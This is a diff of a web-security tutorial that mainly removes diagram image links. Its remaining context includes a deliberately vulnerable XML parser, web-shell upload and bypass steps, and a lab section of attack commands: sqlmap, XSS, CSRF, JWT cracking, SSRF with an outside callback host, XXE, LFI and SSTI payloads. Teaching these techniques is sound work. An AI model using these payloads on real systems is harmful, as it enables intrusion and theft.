-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/vulnerable-code-sticky.svg" alt="Sticky Note: Vulnerable Code" width="30%">
-</a>
-
 
 `java
 // BAD: Default XML parser with external entities
@@ -2629,16 +1808,6 @@ DocumentBuilder builder = factory.newDocumentBuilder();
 Document doc = builder.parse(new InputSource(request.getInputStream()));
 `
 ### Secure Code
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-handwritten.svg" alt="Handwritten: Secure Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-diagram.svg" alt="Diagram: Secure Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-sticky.svg" alt="Sticky Note: Secure Code" width="30%">
-</a>
 
 
 `java
@@ -2656,32 +1825,12 @@ factory.setFeature(""http://xml.org/sax/features/external-parameter-entities"", 
 **Real-World Analogy:** A courier service that accepts packages and executes any executable file inside.
 ### Attack Steps
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-handwritten.svg" alt="Handwritten: Attack Steps" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-diagram.svg" alt="Diagram: Attack Steps" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/attack-steps-sticky.svg" alt="Sticky Note: Attack Steps" width="30%">
-</a>
-
 
 1. Application allows profile picture upload
 2. Attacker uploads shell.php instead of image.jpg
 3. Server stores it in /uploads/shell.php
 4. Attacker accesses shell.php?cmd=id
 ### Bypass Techniques
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/bypass-techniques-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/bypass-techniques-handwritten.svg" alt="Handwritten: Bypass Techniques" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/bypass-techniques-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/bypass-techniques-diagram.svg" alt="Diagram: Bypass Techniques" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/bypass-techniques-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/bypass-techniques-sticky.svg" alt="Sticky Note: Bypass Techniques" width="30%">
-</a>
 
 
 `	ext
@@ -2692,16 +1841,6 @@ shell.php.jpg      -> Double extension
 GIF89a + PHP code  -> Magic byte bypass
 `
 ### Secure Code
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-handwritten.svg" alt="Handwritten: Secure Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-diagram.svg" alt="Diagram: Secure Code" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-code-sticky.svg" alt="Sticky Note: Secure Code" width="30%">
-</a>
 
 
 `java
@@ -2720,16 +1859,6 @@ public String uploadFile(MultipartFile file) {
 ## 14. Security Headers
 
 ### Secure Headers Table
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-headers-table-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-headers-table-handwritten.svg" alt="Handwritten: Secure Headers Table" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-headers-table-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-headers-table-diagram.svg" alt="Diagram: Secure Headers Table" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/secure-headers-table-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/secure-headers-table-sticky.svg" alt="Sticky Note: Secure Headers Table" width="30%">
-</a>
 
 
 | Header | Syntax | Purpose | Risk if Missing |
@@ -2754,16 +1883,6 @@ public String uploadFile(MultipartFile file) {
 
 ### CSP In-Depth
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csp-in-depth-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csp-in-depth-handwritten.svg" alt="Handwritten: CSP In-Depth" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csp-in-depth-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csp-in-depth-diagram.svg" alt="Diagram: CSP In-Depth" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csp-in-depth-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csp-in-depth-sticky.svg" alt="Sticky Note: CSP In-Depth" width="30%">
-</a>
-
 
 
 ```http
@@ -2784,16 +1903,6 @@ Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
 
 ### CSP Evaluator
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csp-evaluator-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csp-evaluator-handwritten.svg" alt="Handwritten: CSP Evaluator" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csp-evaluator-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csp-evaluator-diagram.svg" alt="Diagram: CSP Evaluator" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/csp-evaluator-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/csp-evaluator-sticky.svg" alt="Sticky Note: CSP Evaluator" width="30%">
-</a>
-
 
 
 ```text
@@ -2806,16 +1915,6 @@ Paste your CSP header. The tool scores:
 ```
 
 ### HTTPS Configuration (nginx)
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/https-configuration-nginx-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/https-configuration-nginx-handwritten.svg" alt="Handwritten: HTTPS Configuration (nginx)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/https-configuration-nginx-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/https-configuration-nginx-diagram.svg" alt="Diagram: HTTPS Configuration (nginx)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/https-configuration-nginx-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/https-configuration-nginx-sticky.svg" alt="Sticky Note: HTTPS Configuration (nginx)" width="30%">
-</a>
 
 
 
@@ -2864,16 +1963,6 @@ server {
 
 ### Defense in Depth Layers
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/defense-in-depth-layers-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/defense-in-depth-layers-handwritten.svg" alt="Handwritten: Defense in Depth Layers" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/defense-in-depth-layers-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/defense-in-depth-layers-diagram.svg" alt="Diagram: Defense in Depth Layers" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/defense-in-depth-layers-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/defense-in-depth-layers-sticky.svg" alt="Sticky Note: Defense in Depth Layers" width="30%">
-</a>
-
 
 
 ```
@@ -2892,16 +1981,6 @@ Layer 6: Bug Bounty + Penetration Testing
 ## 16. Practical Exploitation Labs
 
 ### 16.1 SQLi with sqlmap Against DVWA
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-1-sqli-with-sqlmap-against-dvwa-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-1-sqli-with-sqlmap-against-dvwa-handwritten.svg" alt="Handwritten: 16.1 SQLi with sqlmap Against DVWA" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-1-sqli-with-sqlmap-against-dvwa-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-1-sqli-with-sqlmap-against-dvwa-diagram.svg" alt="Diagram: 16.1 SQLi with sqlmap Against DVWA" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-1-sqli-with-sqlmap-against-dvwa-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-1-sqli-with-sqlmap-against-dvwa-sticky.svg" alt="Sticky Note: 16.1 SQLi with sqlmap Against DVWA" width="30%">
-</a>
 
 
 
@@ -2929,16 +2008,6 @@ sqlmap -u "http://dvwa.local/login.php" --data="username=admin&password=test" --
 
 ### 16.2 XSS Testing
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-2-xss-testing-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-2-xss-testing-handwritten.svg" alt="Handwritten: 16.2 XSS Testing" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-2-xss-testing-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-2-xss-testing-diagram.svg" alt="Diagram: 16.2 XSS Testing" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-2-xss-testing-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-2-xss-testing-sticky.svg" alt="Sticky Note: 16.2 XSS Testing" width="30%">
-</a>
-
 
 
 ```bash
@@ -2953,16 +2022,6 @@ curl -X POST "http://dvwa.local/vulnerabilities/xss_s/" --data "txtName=test&mtx
 
 ### 16.3 CSRF with csrfpoc
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-3-csrf-with-csrfpoc-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-3-csrf-with-csrfpoc-handwritten.svg" alt="Handwritten: 16.3 CSRF with csrfpoc" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-3-csrf-with-csrfpoc-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-3-csrf-with-csrfpoc-diagram.svg" alt="Diagram: 16.3 CSRF with csrfpoc" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-3-csrf-with-csrfpoc-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-3-csrf-with-csrfpoc-sticky.svg" alt="Sticky Note: 16.3 CSRF with csrfpoc" width="30%">
-</a>
-
 
 
 ```bash
@@ -2976,16 +2035,6 @@ csrfpoc -u "http://bank.com/transfer" -d "to=attacker&amount=10000" -o poc.html
 ```
 
 ### 16.4 Burp Suite - Intercept, Repeater, Intruder, Proxy
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-4-burp-suite-intercept-repeater-intruder-proxy-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-4-burp-suite-intercept-repeater-intruder-proxy-handwritten.svg" alt="Handwritten: 16.4 Burp Suite - Intercept, Repeater, Intruder, Proxy" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-4-burp-suite-intercept-repeater-intruder-proxy-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-4-burp-suite-intercept-repeater-intruder-proxy-diagram.svg" alt="Diagram: 16.4 Burp Suite - Intercept, Repeater, Intruder, Proxy" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-4-burp-suite-intercept-repeater-intruder-proxy-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-4-burp-suite-intercept-repeater-intruder-proxy-sticky.svg" alt="Sticky Note: 16.4 Burp Suite - Intercept, Repeater, Intruder, Proxy" width="30%">
-</a>
 
 
 
@@ -3014,16 +2063,6 @@ INTRUDER:
 
 ### 16.5 ZAP - Spider, Active Scan, Report
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-5-zap-spider-active-scan-report-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-5-zap-spider-active-scan-report-handwritten.svg" alt="Handwritten: 16.5 ZAP - Spider, Active Scan, Report" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-5-zap-spider-active-scan-report-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-5-zap-spider-active-scan-report-diagram.svg" alt="Diagram: 16.5 ZAP - Spider, Active Scan, Report" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-5-zap-spider-active-scan-report-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-5-zap-spider-active-scan-report-sticky.svg" alt="Sticky Note: 16.5 ZAP - Spider, Active Scan, Report" width="30%">
-</a>
-
 
 
 ```bash
@@ -3046,16 +2085,6 @@ zap-cli quick-scan -o report.html -s all http://target.com
 ```
 
 ### 16.6 JWT Token Manipulation
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-6-jwt-token-manipulation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-6-jwt-token-manipulation-handwritten.svg" alt="Handwritten: 16.6 JWT Token Manipulation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-6-jwt-token-manipulation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-6-jwt-token-manipulation-diagram.svg" alt="Diagram: 16.6 JWT Token Manipulation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-6-jwt-token-manipulation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-6-jwt-token-manipulation-sticky.svg" alt="Sticky Note: 16.6 JWT Token Manipulation" width="30%">
-</a>
 
 
 
@@ -3080,16 +2109,6 @@ jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
 
 ### 16.7 SSRF Exploit
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-7-ssrf-exploit-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-7-ssrf-exploit-handwritten.svg" alt="Handwritten: 16.7 SSRF Exploit" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-7-ssrf-exploit-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-7-ssrf-exploit-diagram.svg" alt="Diagram: 16.7 SSRF Exploit" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-7-ssrf-exploit-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-7-ssrf-exploit-sticky.svg" alt="Sticky Note: 16.7 SSRF Exploit" width="30%">
-</a>
-
 
 
 ```bash
@@ -3106,16 +2125,6 @@ curl "http://vulnerable.com/fetch?url=http://burpcollaborator.net/test"
 ```
 
 ### 16.8 XXE Exploit
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-8-xxe-exploit-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-8-xxe-exploit-handwritten.svg" alt="Handwritten: 16.8 XXE Exploit" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-8-xxe-exploit-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-8-xxe-exploit-diagram.svg" alt="Diagram: 16.8 XXE Exploit" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-8-xxe-exploit-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-8-xxe-exploit-sticky.svg" alt="Sticky Note: 16.8 XXE Exploit" width="30%">
-</a>
 
 
 
@@ -3134,16 +2143,6 @@ curl -X POST "http://vulnerable.com/xml" \
 ```
 
 ### 16.9 Directory Traversal (LFI to RCE)
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-9-directory-traversal-lfi-to-rce-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-9-directory-traversal-lfi-to-rce-handwritten.svg" alt="Handwritten: 16.9 Directory Traversal (LFI to RCE)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-9-directory-traversal-lfi-to-rce-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-9-directory-traversal-lfi-to-rce-diagram.svg" alt="Diagram: 16.9 Directory Traversal (LFI to RCE)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-9-directory-traversal-lfi-to-rce-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-9-directory-traversal-lfi-to-rce-sticky.svg" alt="Sticky Note: 16.9 Directory Traversal (LFI to RCE)" width="30%">
-</a>
 
 
 
@@ -3164,16 +2163,6 @@ curl "http://vulnerable.com/index.php?page=php://filter/convert.base64-encode/re
 ```
 
 ### 16.10 SSTI (Server-Side Template Injection)
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-10-ssti-server-side-template-injection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-10-ssti-server-side-template-injection-handwritten.svg" alt="Handwritten: 16.10 SSTI (Server-Side Template Injection)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-10-ssti-server-side-template-injection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-10-ssti-server-side-template-injection-diagram.svg" alt="Diagram: 16.10 SSTI (Server-Side Template Injection)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/16-10-ssti-server-side-template-injection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/16-10-ssti-server-side-template-injection-sticky.svg" alt="Sticky Note: 16.10 SSTI (Server-Side Template Injection)" width="30%">
-</a>
 
 
 
@@ -3199,16 +2188,6 @@ curl "http://vulnerable.com/greet?name=$class.inspect('java.lang.Runtime').type.
 
 ### 17.1 Race Condition Exploitation
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-1-race-condition-exploitation-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-1-race-condition-exploitation-handwritten.svg" alt="Handwritten: 17.1 Race Condition Exploitation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-1-race-condition-exploitation-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-1-race-condition-exploitation-diagram.svg" alt="Diagram: 17.1 Race Condition Exploitation" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-1-race-condition-exploitation-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-1-race-condition-exploitation-sticky.svg" alt="Sticky Note: 17.1 Race Condition Exploitation" width="30%">
-</a>
-
 
 Race conditions occur when a system's behavior depends on the sequence or timing of uncontrolled events. Attackers exploit this window by sending many concurrent requests.
 
@@ -3223,16 +2202,6 @@ python3 turbo_intruder.py -u "http://vulnerable.com/coupon/redeem" \
 ```
 
 ### 17.2 GraphQL Injection
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-2-graphql-injection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-2-graphql-injection-handwritten.svg" alt="Handwritten: 17.2 GraphQL Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-2-graphql-injection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-2-graphql-injection-diagram.svg" alt="Diagram: 17.2 GraphQL Injection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-2-graphql-injection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-2-graphql-injection-sticky.svg" alt="Sticky Note: 17.2 GraphQL Injection" width="30%">
-</a>
 
 
 GraphQL APIs are susceptible to injection, introspection abuse, and batching attacks.
@@ -3265,16 +2234,6 @@ query {
 
 ### 17.3 WebSocket Attacks
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-3-websocket-attacks-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-3-websocket-attacks-handwritten.svg" alt="Handwritten: 17.3 WebSocket Attacks" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-3-websocket-attacks-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-3-websocket-attacks-diagram.svg" alt="Diagram: 17.3 WebSocket Attacks" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-3-websocket-attacks-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-3-websocket-attacks-sticky.svg" alt="Sticky Note: 17.3 WebSocket Attacks" width="30%">
-</a>
-
 
 WebSocket connections bypass traditional HTTP security controls.
 
@@ -3288,16 +2247,6 @@ ws.onopen = () => ws.send(JSON.stringify({
 ```
 
 ### 17.4 Prototype Pollution (Client-Side)
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-4-prototype-pollution-client-side-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-4-prototype-pollution-client-side-handwritten.svg" alt="Handwritten: 17.4 Prototype Pollution (Client-Side)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-4-prototype-pollution-client-side-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-4-prototype-pollution-client-side-diagram.svg" alt="Diagram: 17.4 Prototype Pollution (Client-Side)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-4-prototype-pollution-client-side-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-4-prototype-pollution-client-side-sticky.svg" alt="Sticky Note: 17.4 Prototype Pollution (Client-Side)" width="30%">
-</a>
 
 
 
@@ -3323,16 +2272,6 @@ function merge(target, source) {
 
 ### 17.5 Cookie Tossing
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-5-cookie-tossing-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-5-cookie-tossing-handwritten.svg" alt="Handwritten: 17.5 Cookie Tossing" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-5-cookie-tossing-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-5-cookie-tossing-diagram.svg" alt="Diagram: 17.5 Cookie Tossing" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/17-5-cookie-tossing-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/17-5-cookie-tossing-sticky.svg" alt="Sticky Note: 17.5 Cookie Tossing" width="30%">
-</a>
-
 
 
 ```text
@@ -3347,16 +2286,6 @@ Browser may send attacker's session cookie to example.com/app
 ## 30. Security Testing Framework
 
 ### Testing Methodology Reference
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/testing-methodology-reference-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/testing-methodology-reference-handwritten.svg" alt="Handwritten: Testing Methodology Reference" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/testing-methodology-reference-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/testing-methodology-reference-diagram.svg" alt="Diagram: Testing Methodology Reference" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/testing-methodology-reference-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/testing-methodology-reference-sticky.svg" alt="Sticky Note: Testing Methodology Reference" width="30%">
-</a>
 
 
 
@@ -3403,16 +2332,6 @@ Phase 7: Reporting
 
 ### CVSS 3.1 Scoring Reference
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-scoring-reference-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-scoring-reference-handwritten.svg" alt="Handwritten: CVSS 3.1 Scoring Reference" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-scoring-reference-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-scoring-reference-diagram.svg" alt="Diagram: CVSS 3.1 Scoring Reference" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-scoring-reference-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-scoring-reference-sticky.svg" alt="Sticky Note: CVSS 3.1 Scoring Reference" width="30%">
-</a>
-
 
 
 ```text
@@ -3437,16 +2356,6 @@ Base Metrics:
 ## 31. Web Security Tools Reference
 
 ### Tool Comparison Table
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/tool-comparison-table-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/tool-comparison-table-handwritten.svg" alt="Handwritten: Tool Comparison Table" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/tool-comparison-table-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/tool-comparison-table-diagram.svg" alt="Diagram: Tool Comparison Table" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/tool-comparison-table-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/tool-comparison-table-sticky.svg" alt="Sticky Note: Tool Comparison Table" width="30%">
-</a>
 
 
 | Tool | Category | Use Case | Command Example |
@@ -3475,16 +2384,6 @@ Base Metrics:
 
 ### Useful Online Resources
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/useful-online-resources-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/useful-online-resources-handwritten.svg" alt="Handwritten: Useful Online Resources" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/useful-online-resources-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/useful-online-resources-diagram.svg" alt="Diagram: Useful Online Resources" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/useful-online-resources-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/useful-online-resources-sticky.svg" alt="Sticky Note: Useful Online Resources" width="30%">
-</a>
-
 
 
 ```text
@@ -3507,141 +2406,41 @@ MITRE ATT&CK:          https://attack.mitre.org/
 
 ### Q16: What is IDOR and how is it different from broken access control?
 
